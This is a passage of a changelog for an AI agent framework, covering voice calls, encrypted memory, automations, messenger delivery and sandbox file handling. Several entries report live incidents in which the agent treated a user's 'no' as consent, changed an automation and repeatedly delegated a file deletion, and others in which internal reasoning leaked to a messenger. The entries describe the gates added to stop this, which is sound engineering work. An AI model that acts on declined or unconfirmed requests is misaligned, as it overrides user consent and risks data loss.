  routes turns, delegation bubbles or the spoken result into the newly
  opened chat. And sub-agents are safe from the voice model swap: while a
  sub-agent computes on the one local model, the server itself now reports
  the call busy (the frontend flag alone dropped too early once the main
  turn ended) and no model swap can start - a voice turn during a sub-agent
  run used to swap the model out mid-inference and crash the sub-agent. The
  call window shows "background task running" during that window and heals
  afterwards. The same protection covers ALL main-lane work now: chat
  generations and running workflows also mute the call on single-model
  setups, not only voice-delegated tasks (a workflow's document generation
  could otherwise be swap-interrupted mid-write).
- **The Telegram bot token no longer leaks into terminal and log files.**
  The Telegram Bot API carries the token in the request URL, and the HTTP
  client's default INFO logging printed that URL on every polling tick -
  into the console and the log files. Request-URL logging is silenced now
  (warnings and errors still come through). If you ever copied terminal
  output containing `api.telegram.org/bot...`, revoke the token via
  `@BotFather` and set the new one in Settings.
- **Local voice turns answer instead of thinking.** A local reasoning model
  (Qwen) burned its entire voice token budget on internal reasoning: the turn
  ended with nothing to speak, no delegation was created, and the code then
  wrongly spoke the "one moment" acknowledgment - a promise with nothing
  behind it. Voice calls now disable thinking on the local server
  (runtime-verified: the same question answers in one sentence instead of
  timing out mid-thought), a reasoning-only reply degrades to the "please
  repeat" nudge, and the acknowledgment is only spoken when a delegation
  actually survived. The acknowledgment itself is now short ("Moment.",
  "One moment.", rotating variants in ten languages) instead of one fixed
  sentence, and the voice agent knows the user's current local date and time,
  so clock questions are answered directly instead of being delegated. The
  delegation instruction is also phrased capability-first with a worked
  example now: a small model read "you cannot use tools" as a reason to
  refuse real work ("I have no tools") instead of delegating it.
- **Starting a live call now loads the local model.** The call button only
  probed for a running model and opened a dead call when it was not loaded
  yet (a chat message was needed to trigger the load). Call start now feeds
  the same activity trigger a chat message feeds, the window shows "loading
  the model" instead of the muted-mic state, and the call comes alive by
  itself (greeting included) once the model is up.
- **web_search no longer claims the web is down when a filtered search finds
  nothing.** With a source filter (trusted sources or smart intent) that had
  zero hits, the internal-memory fallback silently prevented the retry
  without the filter, and a hard-coded banner told the model "the web
  providers are unreachable" on a healthy network - which the model repeated
  to the user. The plain query is now always retried on the real web before
  memory snippets are accepted, and the fallback banner only claims an
  outage when providers actually errored (including the recorded errors);
  otherwise it says the search found nothing.
- **Natural questions now find memories by name.** "Kannst du dich noch an
  Kai erinnern?" returned nothing while a bare "Kai" search hit - filler
  words diluted the lexical score of the one signal word. Query tokens are
  now filtered against per-language stopword lists (maintained in the
  vocabulary book for reuse), and the lexical tokenizer finally keeps
  umlauts, so German words and names like "Müller" are matchable at all.
- **Memory chunk text and the profile cache are now encrypted at rest.** Chunk
  texts (what RAG actually reads) are AES-256-GCM encrypted in place and
  decrypted on read; a startup migration encrypts existing rows, removes the
  unencrypted content previews from memory metadata and neutralizes
  content-derived titles of learned facts. The on-disk user-profile prompt
  cache is encrypted the same way. Docs now state the residual risk honestly:
  embedding vectors stay unencrypted by necessity and are practically
  invertible, so full-disk encryption remains the recommended complement.
- **Memory chunk rows are now row-level-security protected, and the encryption
  key is never silently replaced.** Chunks (the searchable text and embedding
  vectors the RAG actually reads) now carry their own owner scope and the same
  fail-closed forced RLS policy as the parent memories table, stamped at ingest
  and backfilled by a startup migration. A present but corrupt
  `memory_encryption_key` is now a hard startup error instead of being silently
  regenerated, which would have permanently orphaned all encrypted memories.
- **Memory learning produces higher-quality facts.** The extraction prompt now
  enforces self-contained facts (subjects named explicitly instead of "the
  patent"), absolute dating of drifting snapshot facts ("as of {date}"), and
  excludes short-lived conversation state; model-independent gates between
  parse and ingest add length bounds, junk-marker rejection, a per-run cap and
  a near-duplicate check, so a weak model can no longer flood the memory store.
- **Spoken voice-agent replies are capped at a sentence boundary.** A model
  derailed by garbled input could fill its whole token budget with a monologue
  (minutes of TTS); replies are now cut in code, and the prompt tells the
  agent to ask for a repeat instead of guessing at garbled transcripts.
- **Veyllo no longer 400s mid-task after a text-recovered tool call.** When a model
  leaks a tool call as text (deepseek-v4 does intermittently) or a stream loses the
  id, VAF must mint a tool_call id itself; those ids now carry a recognizable
  `call_synth_` prefix (also fixing an id collision when two recoveries happened
  within the same second), and for Veyllo such exchanges are folded into plain-text
  context before sending instead of being replayed structurally (the gateway only
  accepts ids it issued itself). Tasks that previously died with a visible API
  error (e.g. mail checks delegated from a live voice call) now complete.
- **Host-speaker TTS is now opt-in per agent (fail-closed).** With TTS enabled, every
  background turn (web/Telegram/WhatsApp/Discord queue, automations, proactive thinking
  runs, `vaf run -p`, the gateway) used to synthesize and play the answer, a thinking
  filler, and the answer chime on the server machine's speakers, where nobody is
  listening. Agents now carry a `host_audio` construction flag; only the interactive
  CLI sets it. Browser TTS (Read Aloud, auto-speak) is a separate lane and is
  unchanged.

### Added
- **Cloud voice providers: ElevenLabs and OpenAI for speech output and speech input.**
  Settings > Voice gains an admin-only Voice provider section: the TTS and STT
  providers are selectable independently (Local Docker remains the default), with
  per-provider voice and model fields and a new admin-only, read-redacted
  `api_key_elevenlabs` (the OpenAI lane reuses `api_key_openai`). The provider lane
  never breaks a turn: quota, rate-limit and network errors degrade to the local
  engine. The WebSocket audio contract is unchanged (clients still receive WAV),
  Telegram/WhatsApp voice notes honor the provider selection (ElevenLabs answers
  voice replies natively as OGG/Opus), the CLI microphone uses the selected STT
  provider instead of Google's free Web Speech API when one is configured, and the
  local speech containers are only required for the local lane. All speech HTTP
  now goes through a shared client (`vaf/core/speech_client.py`, CI-guarded), and
  the non-admin write hole on the global `stt_enabled` toggle is closed.
  The ElevenLabs model and voice pickers are populated live via an admin-only
  backend proxy (`/api/voice/elevenlabs/*`; the key stays server-side, responses
  cached, hardcoded fallback when unreachable). OpenAI catalogs are current as of
  2026-07: 13 TTS voices (`ballad`, `verse`, `marin`, `cedar` on `gpt-4o-mini-tts`
  only), input capped at 4096 characters, and `verbose_json` language detection
  restricted to `whisper-1`.
- **New tool: schedule_reminder - persistent one-shot reminders without an agent run.**
  The daily calendar check was designed to create one-off reminder automations, but
  create_automation is deliberately stripped from automation runs (runaway guard) -
  the agent silently fell back to set_timer, which is in-memory only and anchored to
  a session via the process-global fallback: reminders from background runs died on
  restart or landed in the wrong chat. A reminder is now stored DATA: the scheduler
  delivers the stored message verbatim at fire_at on the user's main messenger (Web
  UI notification fallback), with no agent run and no tools - which is why the narrow
  lane is safe where create_automation is not. Per-user scoped, bounded (pending cap,
  14-day horizon, 6-hour delivery grace after downtime with honest missed
  notifications), cancellable, excluded from thinking runs (propose-only). The
  calendar-check prompt (default and the existing stored automation) now teaches
  schedule_reminder; the calendar doc no longer claims create_automation is allowed
  inside the run.
- **New tool: send_to_user - channel-agnostic delivery to the user's main messenger.**
  Workflows, automations and the agent previously had to pick a platform tool
  (send_telegram, send_discord, ...) themselves, which froze the platform into stored
  automation definitions and produced wrong deliveries for non-Telegram users. The new
  tool wraps the one canonical router (send_to_main_messenger): the platform is
  resolved at RUN time from the user's main_messenger, a produced file is attached
  best-effort, and when no messenger is reachable the content falls back to a Web UI
  notification instead of being dropped. Switching main_messenger now retargets every
  existing automation automatically. Per-channel send tools remain for explicit
  requests ("send it via Telegram"). The tool joins every send-tool registry copy
  (thinking-mode strip set, agent/engine scope injection, router pinning, workflow
  project-path resolution for file_path) and stays out of the front-office allow-list
  by design. The channel model (rule vs adapter, extension checklist) is documented in
  docs/integrations/CONNECTIONS.md.
- **New built-in workflow: YouTube Summary.** Summarizes a YouTube video from its own
  captions: yt-dlp runs inside the Docker sandbox (installed per run - no host
  installs, no confirmation cascade) and fetches the caption track via ONE metadata
  call plus the signed caption URL (json3) - per-language subtitle file downloads
  turned out to be far more rate-limited and burned a live run in 429s while the
  captions existed; the robust method was discovered by the coder sub-agent
  improvising after that failure and is now the workflow's own. A validated
  generation step writes the Markdown summary into the chat workspace and is
  explicitly forbidden from fetching content itself (an agentic coder otherwise
  spends minutes re-hunting the transcript on a failure marker). Videos without
  captions (or a momentary rate limit) produce an honest note instead of an invented
  summary. Composed from a live session where the agent built this lane ad-hoc over
  confirmed host commands.
- **analyze_image can inspect images from the chat workspace (`image_path`).** The vision
  tool only accepted user attachments, so an agent that had just produced a chart could
  not quality-check it and spiraled through header-parsing and OCR detours instead
  (observed live). It now also takes a path to an image file inside the chat's own
  workspace - and only there: paths outside the workspace are refused, so the vision
  model can never be used to describe foreign files.
- **python_sandbox can deliver the files it produces (`export_files`).** Binary
  artifacts had no scalable path out of the sandbox: the base64-through-context detour
  truncated anything beyond the model's output budget (a ~400KB chart arrived as 2.5KB
  of corrupt PNG). Code can now write files to relative paths and declare them in
  `export_files`; they are copied out of the container into the chat workspace after a
  successful run (before the scratch dir is removed), show up in the UI file browser,
  and never pass through the model's context. Only sandbox scratch paths can be named;
  the destination is always the chat's own workspace. Works with both the persistent
  and the ephemeral sandbox container.
- **The main agent can now save files directly with `write_file`.** Saving a single
  finished artifact (an SVG, an HTML page, a text file) previously required guessing
  between unrelated tools, and the sandbox's own guidance pointed at `write_file` - a
  tool the main agent did not have (it was sub-agent-only), so following the
  instruction produced "Unknown tool". `write_file` is now registered to the main
  agent: relative paths land in the current chat's workspace, explicit absolute paths
  are honored (VAF's own directory and system locations stay protected), non-admin
  (remote) users are jailed to their own `VAF_Projects` area, and the Web UI file
  notifications are attributed to the calling chat session. Background thinking runs
  (propose-only) deliberately do not get the tool, and the write no longer triggers a
  confirmation prompt (the plan gate still applies, consistent with document_writer).

### Changed
- **The agent can now author full-power workflows itself.** create_agent_workflow's
  engine and save path always supported multi-parameter steps, but the schema the
  model sees never advertised them - an agent-created workflow could not express a
  sandbox step with pip packages or exported artifacts. The step schema now documents
  `args` (with python_sandbox packages/export_files and write_file examples), inline
  `{variable|fallback}` defaults for saved workflows, and the brace-safety rule for
  embedded Python code (a brace block containing a dot is a variable lookup and breaks
  the run). The validation guidance also no longer reads as run_temp-only: the
  validate flag works in saved workflows too, and the builder now tells the agent to
  flag deliverable steps in create mode as well.

### Fixed
- **The last platform-hardwired prompt surfaces are channel-agnostic.** The librarian's
  found-one-file hint said "To send via Telegram" regardless of the user's messenger,
  the channel-capabilities prompt picked its send tool via a hardcoded ternary that
  defaulted to send_telegram (CLI sessions now get send_to_user), the ask-once guidance
  now teaches send_to_user for delivery, and the delegation send-success heuristic no
  longer contains bare platform names - which also fixes a latent false positive
  ("Failed to send Telegram message" counted as a successful send). The front-office
  owner-notification mapping gains its missing slack line.
- **The dead 'email' main_messenger value is gone.** update_user_identity accepted
  main_messenger="email", but the identity store heals it to None on every read and the
  delivery router never dispatches e-mail - the value could be stored yet never worked.
  Removed from the tool enum, both validators and the front-office mapping; the channel
  registry drift guard now rejects any value outside KNOWN_CHANNELS.
- **send_discord can attach documents.** The core Discord sender supported file uploads
  all along; only the tool schema hid them, so agents fell back to other channels for
  files. send_discord now accepts file_path with the same path validation and result
  phrasing as send_telegram.
- **Automations no longer get registered twice in the scheduler.** The create_automation
  tool auto-started the scheduler on its own manager instance (whose running-flag was
  False even while the process scheduler ran); since the schedule registry is
  module-global, every job was registered a second time and a second loop thread
  started - each task then triggered twice on every firing, with only the run lock
  preventing double execution. The tool now goes through the process-wide
  ensure_scheduler_started helper, and start_scheduler itself refuses to run on a
  non-singleton manager instance (defense in depth).
- **Background-run identity no longer leaks between concurrent runs.** ask_user's
  automation-handoff branch, thinking/automation tool registration and dispatch
  injection gated on process-wide env vars (VAF_IN_AUTOMATION / VAF_THINKING_MODE),
  which are shared across threads: while a scheduled automation was running, a
  concurrent thinking run's question was misrouted into an automation handoff
  bundle (three occurrences in the 07:00 window), which later steered a user reply
  into unintended actions. Agents now carry a per-instance run kind stamped at
  construction (thinking / automation / chat); env remains only a fallback for
  embedders. Handoff bundles are additionally data-minimized: text-only capped
  snapshots, and resolved bundles drop their history entirely.
- **Replies to background questions no longer trigger unconditional task continuation.**
  The reply-pickup note asserted "CONTINUE the task now" whenever a handoff bundle was
  linked, without validating the bundle and without a decline or ambiguity lane - a
  mislabeled, finding-less bundle framed a plain "nein bitte nicht" as an automation
  continuation and the agent mutated an automation and attempted file deletion.
  Pickup now validates the bundle (automation source + curated findings), degrades to
  a plain-question note otherwise, and every lane is reply-conditional: clear
  agreement continues, a decline changes nothing, an ambiguous reply gets exactly one
  confirming question before any action. Each pickup writes a [REPLY_CTX] audit line.
- **Two confirmation gates stop unconfirmed actions around background questions.**
  (a) While a turn handles the user's reply to a tracked background question, stored-state
  mutations (automation create/update/delete, workflow/tool builders) and destructive
  sub-agent delegation are blocked with a confirm-style result unless the reply is a
  clear affirmative - the agent acknowledges and asks one confirming question instead
  (live incident: a misread "nein bitte nicht" mutated an automation and delegated a
  file deletion). (c) Once the agent's own reply asked the user a blocking question,
  background drain turns deliver results but cannot launch new write-level tools or
  delegations until the user answers; the drain's retry instruction becomes a status
  report meanwhile (live incident: deletion was re-delegated twice AFTER the agent had
  asked "Soll ich die Datei jetzt direkt loeschen?"). Kill-switches:
  proactive_reply_mutation_gate_enabled, ask_first_drain_gate_enabled.
- **Sub-agent result summaries can no longer leak chain-of-thought to messengers.**
  The result drain hand-copied a shorter sanitizer chain than the normal reply path
  and built its text from the raw stream buffer - 1034 characters of untagged English
  deliberation reached the user on Telegram. All messenger sends (normal headless path
  and drain) now share one sanitizer chain including a conservative, language-agnostic
  guard against untagged chain-of-thought prefixes; the drain summary is based on the
  reasoning-stripped chat_step return value, and an empty-after-sanitize summary falls
  back to a deterministic localized result excerpt instead of a noise placeholder.
- **The librarian refuses deletion tasks honestly instead of answering with folder
  statistics.** The librarian has no delete capability, but its filesystem-map fast
  path keyword-matched 'document' inside a task's PATH ('/home/.../Documents/...')
  and answered four delete/verify tasks with canned Documents statistics - neither
  doing nor refusing anything, which fueled the caller's retries. Destructive tasks
  (destructive verb governing a file/folder/path target, DE+EN, per sentence) are now
  refused before any fast path with an explicit capability statement; the map's quick
  answers match intent words with word boundaries after stripping paths and filenames
  ('mov' no longer matches 'remove', 'doc' no longer matches 'docker'), and the tool
  description tells the delegating agent up front that deletion is impossible.
- **Automation timeouts no longer deliver half results twice.** The prompt-run bound
  (previously 180s - unrealistic for real tasks) ignored the timeout sentinel: the
  half-streamed text became the "result", was wrapped into a junk output file and
  pushed, while the abandoned worker finished minutes later and delivered again
  (observed twice live: double message, double attachment). The default is now 600s,
  the sentinel is evaluated, and on timeout the runner waits a bounded grace window
  for the abandoned worker - both live cases would have recovered into one normal,
  complete delivery. Only past the grace does the user get one honest timeout note:
  no partial result, no file wrap, status error.
- **Generated automations no longer message the user raw tool output.** The automation
  workflow generator wrote send steps like "here is the data: {search_results} - please
  summarize" - but send steps are deterministic and deliver their arguments verbatim,
  so the user received a raw search-result dump with a dangling instruction, and the
  HTML report the same automation produced was never attached. The generator now
  teaches the channel-agnostic delivery step (send_to_user incl. file_path attachment),
  that send/write steps are verbatim (produce the final text in a CONTENT_ONLY step
  first), and that a platform tool must never be hardwired; its canonical example
  summarizes before sending and attaches the produced file. The calendar-check prompt
  teaches the same delivery step instead of enumerating platform tools.
- **Automation results are no longer delivered twice, and the Web UI no longer shows
  tool chatter as a saved file.** When an automation already delivered in-run via a
  send tool, the post-run pipeline additionally pushed the run summary to the
  messenger (two messages per run); it now skips the messenger push on a confirmed
  in-run delivery, in BOTH lanes: workflow-based (send step result) and prompt-based
  (send-tool success in the agent history - live incident: the daily calendar check
  messaged the user twice). The history check also recognizes the end-of-turn squash
  form: chat_step consolidates tool results into one "[Context: tools used this turn]"
  system note, which is the only shape left by the time the post-run delivery decision
  runs (live: a real send was missed and the user got the push on top). Detection is
  conservative: a failed or unclear send keeps the push (a duplicate beats a lost
  message). The "saved file" line in the Web UI
  result showed the raw last-step result string (live: "Gespeichert: Message sent to
  the user via Telegram.") - it now appears only when the last step's output actually
  is a file on disk.
- **Router-delivered messenger messages now leave a trace in the channel session.**
  The per-platform send tools record their own sends, but the canonical router path
  (automation result push, send_to_user) delivered without writing to the channel
  session history or message store - so when the user replied to such a message, the
  channel main agent had never seen it and confabulated (live incident: the agent
  could not know which "Timer" the user meant). Successful router sends are now
  mirrored into the channel session (and, where the bridge does not record outbound
  itself, the channel message store). Thinking-mode deliveries opt out: tracked
  requests are reconstructed scope-keyed at reply time and would appear twice.
- **Workflow runs open the Workflow Runtime panel again in TLS setups.** The `@workflow`
  subprocess posted its UI events (workflow_start/update/done, terminal lines) to a
  hardcoded plain-HTTP 127.0.0.1:8001 - with local_network_tls_enabled that port speaks
  HTTPS, every event died silently, and the frontend (never learning a workflow was
  running) showed the generic SubAgent window instead of the Workflow Runtime panel.
  Subprocess senders now resolve the backend through a shared TLS-aware helper
  (internal plain-HTTP port 8005 when TLS is on); the vaf-run terminal's
  heartbeat/health probes had the same blindness and use it too.
- **`@workflow` runs no longer fail with "Tool not found" for sandbox steps.** The
  `@workflow` CLI subprocess, the in-chat executor and the run_temp overlay each
  hand-maintained their own copy of the workflow tool set, and the copies had drifted -
  the subprocess lacked python_sandbox entirely, so a template using it failed its
  first step. All runners now build from one shared list, and a test enforces that
  every tool named by any built-in template is constructible headless. The workflow
  variable extractor also no longer mistakes URLs for file paths (a YouTube link
  became the output filename "//www.youtube.com").
- **A chat's system prompt can no longer advertise another chat's workspace.** With
  parallel main workers, the "this chat's workspace" line and the document writer's
  output folder were resolved through a process-global session pointer that belongs to
  whichever chat touched it last - a fresh chat was told its workspace is the previous
  chat's folder and dutifully saved its deliverable there. Session-derived paths now
  always key on the chat's own session id. The session-workspace anchor
  (session.project_path) is also written by one shared setter on BOTH notification
  paths - previously only files from subprocess sub-agents anchored it, so chats whose
  files were written in-process never got the workspace context note - and the runner
  derives the workspace deterministically when the anchor is missing but the folder
  exists on disk.
- **Deliverables are steered into the chat workspace instead of scattering across the
  filesystem.** A finished artifact could end up in the VAF_Projects root, where the UI
  file browser (the only file access remote/LAN clients have) never shows it. The
  session-workspace context now states that final outputs belong in the workspace,
  write_file flags successful writes that land outside it in the same turn, the coder
  is taught the binary lane (render in the sandbox, save via content_base64) instead of
  writing script source into image-named files, and the built-in "Research & Code"
  workflow declares that it produces text code and cannot emit binary files.
- **The machine owner is no longer locked out of write_file.** The per-user write jail
  treated only an EMPTY user scope as admin, but a logged-in owner session carries the
  admin's real UUID - the owner got "Access denied: outside your own data" on their own
  VAF_Projects folder (observed live). Admin detection now mirrors the librarian jail:
  no scope OR the configured local_admin_scope_id means full access.
- **write_file can now save binary files.** Rendering an image had no supported path:
  write_file only took text, so a sandbox-rendered PNG had to detour through confirmed
  host shell commands (including a host pip install). write_file now accepts
  content_base64 for binary data - render in python_sandbox, print the file as base64,
  save it with write_file; the sandbox's persistence guard message documents the lane.
- **Tool argument errors no longer misreport enum violations as type errors.** A valid
  string that violated an enum (e.g. a task status) was reported as "expects string,
  got str", which a model cannot act on; non-type failures now surface jsonschema's own
  message ("'x' is not one of [...]"), and the reactive know-how lane also recognizes
  "[ERROR]"/"Access denied" shaped failures.
- **Sub-agent failures now carry the failed tool's learned know-how.** When a delegated
  sub-agent (coder, research, document, browser) failed, the error arrived later via the
  result drain as a bare message - the reactive know-how lane never fired because the
  tool call itself had only returned a "task delegated" marker. Both drains (chat/runner
  and the `vaf run` terminal) now attach the tool's learned pitfalls and procedure to the
  failure message, include the original task for context, and feed novel errors into
  background re-learning. The pitfall matcher also strips filesystem paths before
  matching, so path-heavy errors ("File exists: /long/path/...") can match stored
  pitfalls.
- **Learned tool know-how no longer rots silently when it fails the quality gate.** The
  Whare Wananga delivery gate (confirmed + challenge passed + actually probed) silenced
  18 of 67 learned records completely - including ones whose stored pitfalls held exactly
  the knowledge that would have prevented a live failure. Two changes: on the reactive
  lane (a tool call just failed) gate-failing records are now delivered too, clearly
  tagged "UNVERIFIED" (the proactive schema injection stays strictly gated), and every
  gate reject lands in a persistent re-training queue instead of being dropped - shown
  and drained via `vaf ww queue [--scan]` and `vaf ww retrain --pending` (3 attempts per
  tool, 24h cooldown), or automatically by the opt-in eager training worker.
- **document_writer no longer silently accepts non-document filenames.** The tool
  declared .txt/.md/.docx but wrote ANY extension as a rendered "text" document - a raw
  .svg happened to survive, an .html request came out as a text rendering of the input
  instead of HTML. Filenames outside .txt/.md/.docx are now rejected with a redirect to
  the right tool (write_file for raw files, coding_agent for code projects), a missing
  extension is derived from the format parameter (previously format="word" with a bare
  name, or with report.txt, wrote Word bytes into a .txt file), and failures return a
  "Tool Error:" prefix so workflows score them as failed steps instead of successes.
- **The coding agent no longer treats a target FILE path as its project directory.** A task
  like "save it as /path/chart.html" made the coder use the full file path as the project
  folder: the run crashed with "File exists" when the file was already there, and otherwise
  created a DIRECTORY named `chart.html` with the real file nested inside it. File-shaped
  paths (existing files, or unknown paths with a known file extension) are now split into
  project directory + target filename; the filename is passed to the model as the explicit
  deliverable, the safety guard judges the directory part, and a blocked project directory
  now returns an actionable error instead of a crash. The path extraction also keeps file
  extensions intact (previously truncated after "path:"/"in directory" phrases and in
  Windows paths) and no longer swallows closing quotes around quoted paths.
- **The installer no longer fails on a too-new Python (e.g. 3.14).** Both installers accepted
  any Python at or above 3.10, so a machine whose newest Python was 3.14 built the venv with an
  unsupported interpreter and the dependency install crashed while compiling packages that have
  no prebuilt wheels for it yet. The installers now accept only the CI-tested range (3.10-3.13),
  automatically provision a supported Python via uv when the system one is outside that range,
  and recreate an existing venv that was built with an unsupported Python. The Windows installer
  also reports wheel-build failures honestly (unsupported Python / missing prebuilt wheel)
  instead of blaming a "network hiccup".

### Changed
- **search_tools now returns call signatures for the top matches.** Discovering a tool
  by keyword only returned its name and one description line, so the model had to
  guess parameter names on the first call (observed live: an invented argument name
  producing a schema error). The top three matches now include a compact signature
  (required parameters first, optional ones bracketed); the output stays within the
  tool-result budget and the discovery post-hook keeps working unchanged.
- **Voice input (pyaudio) is now an optional extra instead of a core dependency.** pyaudio ships
  no prebuilt wheels for brand-new Python versions and its source build needs the PortAudio C
  headers, which could break the whole installation. It moved out of `requirements.txt` into the
  existing optional `vaf[speech]` extra; CLI microphone input degrades gracefully without it and
  web/desktop microphone capture is unaffected. Install it with `pip install pyaudio` (or
  `pip install "vaf[speech]"`) if you use CLI voice input.

## [0.1.0a10] - 2026-07-09

### Security
- **RAG snippets no longer leak between users on the local network.** In multi-user mode the
  memory-search snippets shown in the chat "RAG-Snippets" panel were pushed to the browser via a
  global WebSocket broadcast to every connected client, so one user's snippets - including those
  from a background thinking or automation run under another user's scope - could appear in a
  different logged-in user's panel. Retrieval itself was always correctly scoped per user; only the
  UI push was global. The push is now routed to the owning user's connections only and dropped when
  the scope is unknown (fail-closed); the same fix applies to the context X-ray payload
  (`real_context_payload`) and the memory-learning status banner (now scoped to the session), and
  the UI clears the snippet panel on session switch. Requires a restart.

## [0.1.0a9] - 2026-07-08

### Added
- **Choose light or dark mode during first-run setup.** A new step right after the language
  picker lets you pick Light or Dark; the choice applies live (onboarding switches immediately)
  and carries into the app. Light stays the default.

### Changed
- **The WhatsApp connection is temporarily marked "Coming Soon".** In Settings > Connections it
  now shows greyed out with a disabled, non-clickable card, like the other not-yet-available
  integrations. This is a UI gate only (the backend is unchanged) and is easily reverted.

### Fixed
- **The browser tool no longer crashes on startup with Chromium 150+.** With the Debian bookworm
  `chromium 150.0.7871.46` build, the browser container died about a second into launch (SIGTRAP)
  whenever the profile resolved to an EEA region, so every browser task failed with "Chrome
  DevTools at http://localhost:9222 did not respond" (Debian bug #1141618; `149` was fine, `150`
  regressed). The container now launches Chromium without `--no-first-run` (the specific trigger)
  and keeps the first-run search-engine choice quiet with `--disable-search-engine-choice-screen`
  and `--search-engine-choice-country=US`; it also supervises Chromium (relaunches it if it exits,
  reaps orphaned child processes, and serves the CDP proxy only while the browser is live) so a
  one-off crash self-heals in seconds instead of leaving the tool permanently unreachable. Apply
  with a browser image rebuild: `docker compose -f docker-compose.memory.yml up -d --build vaf-browser`.
- **Dark-mode buttons stay readable on hover.** Emphasis buttons (e.g. "Save Changes",
  "Connect") turned dark on hover in dark mode while their text stayed dark, making the label
  unreadable; they now brighten slightly on hover so the text stays readable. Applied
  consistently across the whole UI.

## [0.1.0a8] - 2026-07-06

### Fixed
- **`vaf update` now works from any terminal.** The updater was reachable only through a
  shell alias (Linux/macOS, active only in a freshly-sourced interactive shell) and had
  no `vaf` command at all on Windows, so `vaf update` reported "command not found" and
  users could not self-update. The installer now registers a real `vaf` command:
  `~/.local/bin/vaf` on Linux/macOS (on PATH, works in every shell) and a shipped
  `vaf.bat` added to the user PATH on Windows. Until the installer is re-run, the
  always-available fallback is the shipped run script (`run_vaf.bat update` on Windows,
  `./run_vaf.sh update` on Linux/macOS), and the in-app "update available" hint now shows
  the platform-correct command.
- **`vaf update` self-heals a non-git install.** An install created from a downloaded ZIP
  (no `.git`) previously failed with "not a git checkout; re-install from git" and could
  never update. `vaf update` now offers to convert such a folder into a git checkout of the
  official repo in place (git init + origin remote, then adopt the release with
  `git reset --hard`) and continues the normal update. Your settings (`~/.vaf`) and build
  artifacts (venv, `web/.next`, `node_modules`) are left untouched - only tracked source is
  reset to the release. After that, future updates work normally.
- **`vaf update` finds VAF's own git when git is not on PATH.** The Windows installer downloads
  portable MinGit but did not persist it to PATH, so `vaf update` (and any git operation) failed
  with "Git is not installed." on machines without system git - even though a usable git had just
  been fetched. Git operations now resolve VAF's bundled MinGit as a fallback, and the bootstrap
  installer also persists it on the user PATH, so neither VAF nor the user needs a separate git
  install.
- **A harmless startup error about the `run_tests` tool is gone.** The main agent tried to
  instantiate a coder-only tool that needs a project directory, printing
  `Failed to instantiate tool run_tests` on every start (the agent continued fine); it is now
  correctly marked coder-only and no longer logs the error.


## [0.1.0a7] - 2026-07-06

### Added
- **Dark mode.** A neutral `#181818` dark theme for the whole web UI, toggled under
  Settings → Interface → Appearance (default light; stored per-browser). It uses a
  folding Tailwind palette swap so light mode stays byte-identical, with a consistent
  light-neutral for active/emphasis controls (no blue or amber accent) and status
  colors kept semantic. The exact per-theme colors of every surface, control and the
  agent avatar are documented in `docs/web-ui/LIGHTMODE.md` and
  `docs/web-ui/DARKMODE.md`.
- **The coder window shows what the agent is doing, live.** The VS-Code-style sub-agent window
  renders a red/green diff of the file being edited directly in the code pane - based on a
  run-start snapshot, so a previous run's changes are not shown - auto-scrolls to the change, and
  mirrors files into the editor as the agent reads them, so orientation, review, and documentation
  phases are visibly active instead of looking stuck. A phase indicator (Planning / Building /
  Finalizing) with a live spinner keeps file-less phases clearly ongoing.
- **A multi-tab coder editor.** A persistent "Live" tab always streams what the agent is doing;
  clicking a file in the Explorer opens it in its own closable tab, so browsing a file no longer
  hides the live view.
- **The coding agent can search the codebase while building,** not only while planning, so it can
  locate existing code before changing it.
- **HTML deliverables open as a rendered preview.** Clicking an `.html` file in a sub-agent window
  opens it in the HTML viewer instead of showing raw source.
- **The Windows installer checks hardware virtualization first - before any WSL2/container
  work.** It verifies that a hypervisor is running or Intel VT-x / AMD-V is enabled in the
  firmware (no admin rights needed for the check) and stops with clear BIOS/UEFI instructions
  when virtualization is disabled, instead of failing minutes later with the cryptic WSL error
  0x80370102. Windows Home is fully supported - only the hypervisor platform is required, not
  the Hyper-V role.

### Fixed
- **The coding agent no longer crashes on cloud providers mid-run.** A malformed message history -
  a status nudge inserted between an assistant's tool calls and their results - made strict
  providers (DeepSeek, OpenAI) reject the request with `400 "insufficient tool messages following
  tool_calls"`. The history is now normalized before every request so tool results always
  immediately follow their tool call, for all providers.
- **A plan whose items the model sends as objects no longer crashes the coder.** Task titles are
  coerced to plain text at the data-model boundary (the description is extracted from
  `{"text": ...}` / `{"task": ...}` shapes), covering both a fresh `set_todos` call and
  loading or resuming a previously-persisted plan, and self-healing an already-affected
  `tasks.json`. A raw object title otherwise crashed downstream `title[:N]` or `title.lower()`
  (on Python 3.12+, `object[:50]` raises `KeyError: slice(None, 50, None)`).
- **The coding agent is given time to finish a long edit** instead of being cut off by a fixed
  timeout; it runs until genuinely idle.
- **The coder edits the intended file surgically:** `edit_file` and `write_file` are chosen by
  intent, and an oversized whole-file "edit" is rescued into a full write instead of failing.
- **The coder console follows the tail reliably** - the live output no longer freezes after a pause.
- **A new coder request plans from scratch** instead of resuming a leftover task list from a
  previous request.
- **The workspace viewer stays on the workspace you opened,** not the active chat.
- **A file the agent "saved" no longer silently vanishes.** When the agent used `python_sandbox`
  to write a file to your workspace, the write went to the sandbox's isolated Docker filesystem
  and was discarded - while the code's own `print("Saved: ...")` made it look successful, so the
  file never appeared. `python_sandbox` now blocks writes aimed at a workspace/host path and
  redirects the agent to `write_file` (which actually persists to the chat workspace); its
  description also states the sandbox filesystem is ephemeral.
- **The main agent reacts the moment a sub-agent finishes,** instead of only when you next send a
  message. A finished sub-agent (coder, research, document, …) now pushes an internal
  notification that wakes the main runner immediately - with the previous periodic poll kept as a
  fallback, and the runner drains every session's result, so a completion is never missed because
  the runner's "current" session had moved on.
- **You can keep chatting while a sub-agent works (API mode).** The main agent now knows a
  sub-agent is running for your chat and keeps replies light: it will not start heavy new work,
  will not delegate the same task twice (a duplicate spawn is refused outright), and leaves the
  sub-agent's workspace alone; typing and sending stay unlocked the whole time. Safety fixes that make
  this reliable: a streamed reply is NEVER erased anymore - if it sounds like completion while the
  sub-agent still runs, it stays visible and a note keeps the next turn honest; the result is delivered once, by
  the background runner, with all window/messenger notifications - not mixed into a chat reply;
  a result is never validated against unrelated small talk (no more forced-retry storms);
  chatting can no longer force-expire a long run (the 30-minute hardcoded reaper now honors the
  configured timeout); and pressing Stop while a reply streams stops only the reply - the
  sub-agent keeps working (stopping it is an explicit second press when nothing is streaming).
  On local mode nothing changes (the adapted behavior is API-only; the single local
  llama server should not serve two inferences at once).
- **The coding agent works on the Veyllo API.** The coder resolved providers from its own
  hardcoded list that was missing `veyllo`, so switching the provider to Veyllo made every
